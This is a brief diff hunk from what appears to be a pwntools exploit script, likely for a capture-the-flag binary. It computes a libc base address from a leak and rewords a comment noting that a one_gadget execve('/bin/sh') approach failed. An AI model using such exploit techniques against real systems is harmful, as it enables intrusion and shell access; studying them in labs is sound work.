@@ -65,7 +65,7 @@ if __name__ == "__main__":
     LIBC_BASE = mmap - 0x5ea000
     log.info('LIBC_BASE: %#x' % LIBC_BASE)
 
-# ONE_GADGET approach failed! couldn't meet the constraints.
+# ONE_GADGET approach failed! couldn't overcome the constraints.
 #
 # 0x4526a execve("/bin/sh", rsp+0x30, environ)
 # constraints:
